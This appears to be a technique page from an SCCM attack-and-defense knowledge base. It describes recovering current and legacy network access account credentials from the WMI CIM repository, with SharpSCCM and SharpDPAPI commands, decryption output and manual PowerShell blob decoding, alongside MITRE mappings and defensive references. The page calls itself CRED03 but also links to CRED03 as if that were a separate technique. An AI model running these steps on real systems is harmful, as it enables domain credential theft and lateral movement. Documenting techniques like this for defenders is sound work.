# Retrieve legacy network access account (NAA) credentials from the CIM Repository

## Code Name
- CRED03

## MITRE ATT&CK TTPs
- [TA0006 - Credential Access](https://attack.mitre.org/tactics/TA0006/)
- [TA0004 - Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
- [T1555 - Passwords from Password Stores](https://attack.mitre.org/techniques/T1555/)

## Required Privilege / Context
- Local administrative privileges on the SCCM client

## Summary
The network access account (NAA) is an account that can be configured on the SCCM site server. The NAA is used  to access and retrieve software from a distribution point but serves no other purpose on the client. The credentials are retrieved by clients as part of the Computer Policy. Once received by the client, the credentials are stored in the `CCM_NetworkAccessAccount` class in the `root\ccm\policy\Machine\ActualConfig` WMI namespace.

This technique may apply whether an NAA is currently configured ([CRED03](../CRED03/credential03-description.md)) or not. Therefore, even if [CRED03](../CRED03/credential03-description.md) is fruitless, there is still hope.

Data stored within WMI classes exists on disk in the CIM repository file located at `C:\Windows\System32\wbem\Repository\OBJECTS.DATA`. Due to the [nuance](https://github.com/mandiant/flare-wmi/blob/master/python-cim/doc/data-recovery.md) of how WMI and CIM clean up these objects, they may be cleared from the database (as read from a WMI context) but still persist on disk in the CIM repository file.

The credentials exist in the file in the following format: `CCM_NetworkAccessAccount  <PolicySecret Version="1"><![CDATA[0601000001000000D08C9DDF0115D1118C7A00C04FC297EB...`. The file can be searched either manually in a text or hex editor, or automated with [SharpDPAPI's search command](https://github.com/GhostPack/SharpDPAPI?tab=readme-ov-file#search): `SharpDPAPI.exe search /type:file /path:C:\Windows\System32\wbem\Repository\OBJECTS.DATA`.

If an encrypted blob exists, it can be extracted and decrypted using the SYSTEM DPAPI masterkey and [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) or automated with [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)'s `local secrets -m disk` command.

## Impact

This technique may allow an attacker to retrieve plaintext domain credentials. Even if the NAA is not over-privileged, domain credentials may be useful for attackers where explicit credentials are required, such as proxying tooling into an environment over command and control (C2). If the NAA is overprivileged, this technique enables lateral movement to other clients and/or sensitive systems.

We (SpecterOps) commonly see accounts that are members of the `SCCM Administrators` and `Domain Admins` groups configured as the NAA.

Currently-configured NAAs and/or legacy NAA configurations may be present in the CIM repository file. If so, an attacker can recover legacy accounts that have been configured for NAA in the past. For example, if a system administrator configure their SCCM Admin account as the NAA when the site was created but, years later, fixed their mistake and no longer use an overprivileged NAA or NAA at all, their SCCM Admin credentials may still be on disk on SCCM clients.

## Examples

### SharpSCCM

```
PS C:\tools\> .\SharpSCCM.exe local secrets -m disk

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |    v2.0.1.0
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem

[+] Retrieving secret blobs from CIM repository

[+] Modifying permissions on registry key: SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal\
[+] Modifying permissions on registry key: SECURITY\Policy\PolEKList
[+] Reverting permissions on registry key: SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal\
[+] Reverting permissions on registry key: SECURITY\Policy\PolEKList

[+] Secret: DPAPI_SYSTEM
    full: <SNIP>
     m/u: <SNIP> / <SNIP>

[+] SYSTEM master key cache:
    {GUID}:SHA1
    {GUID}:SHA1
    {GUID}:SHA1

[+] Decrypting 3 network access account secrets

    NetworkAccessUsername: APERTURE\networkaccess
    NetworkAccessPassword: SuperSecretPassword

    NetworkAccessUsername: APERTURE\networkaccess
    NetworkAccessPassword: SuperSecretPassword

    NetworkAccessUsername: APERTURE\networkaccess
    NetworkAccessPassword: SuperSecretPassword

[+] Completed execution in 00:00:03.4568194
```

### Manual

- Retrieve SYSTEM masterkey with SharpDPAPI's `machinetriage` module
- Enumerate encrypted secrets using SharpDPAPI's `search` module
- If present, manually extract the blob
- Manually parse with PowerShell:

```
PS C:\Users\labadmin\Desktop> $str = "0601000001000000D08C9DDF0115D1118C7A00C04FC297EB010000007DCB965EA2D25D458FFA078B7AA1010700000000020000000000106600000001000020000000D8FB66BC9F1E0DCC33416AF0FE95594657F4EF386169990ADB82AB21F4600359000000000E80000000020000200000008674CA3CCB29140976E02445A46F0CA748EDBAC0D847AABA911444EAAA4571FA30000000AFDABECB9D275177B6631E6EEE7C472A2B007768544A408EC45CE5BA94B5DDD9950A9AF814485026A263255C857F3DAF4000000088A3FE3B78029E43339E767845E0367BA98079E27F808472D29975D5486E7E1F37B70FC85D1830ED9EFDFCF3F2310F451C649CE974638278B60B218E7BAF2DAF"
PS C:\Users\labadmin\Desktop> $bytes = for($i=0; $i -lt $str.Length; $i++) {[byte]::Parse($str.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber); $i++}
PS C:\Users\labadmin\Desktop> $b64 = [Convert]::ToBase64String($bytes[4..$bytes.Length])
PS C:\Users\labadmin\Desktop> .\SharpDPAPI.exe blob /target:$b64 /mkfile:masterkeys.txt

  __                 _   _       _ ___
 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.12.0


[*] Action: Describe DPAPI blob

    guidMasterKey    : {5e96cb7d-d2a2-455d-8ffa-078b7aa10107}
    size             : 262
    flags            : 0x0
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      :
    dec(blob)        : SuperSecretPassword


SharpDPAPI completed in 00:00:00.0397643
```


## Defensive IDs
- [PROTECT04](../../defense-techniques/PROTECT04/protect04-description.md)
- [PROTECT05](../../defense-techniques/PROTECT05/protect05-description.md)
- [PROTECT11](../../defense-techniques/PROTECT11/protect11-description.md)
- [PROTECT16](../../defense-techniques/PROTECT16/protect16-description.md)

## References
- Duane Michael, The Phantom Credentials of SCCM: Why the NAA Won’t Die, https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9
- Chris Thompson, SharpSCCCM, https://github.com/Mayyhem/SharpSCCM
- Will Schroeder, SharpDPAPI, https://github.com/GhostPack/SharpDPAPI
- William Ballenthin, FlareWMI, https://github.com/mandiant/flare-wmi
- William Ballenthin, Matt Graeber, Claudiu Teodorescu, Windows Management Instrumentation (WMI) Offense, Defense, and Forensics, https://www.mandiant.com/sites/default/files/2021-09/wp-windows-management-instrumentation.pdf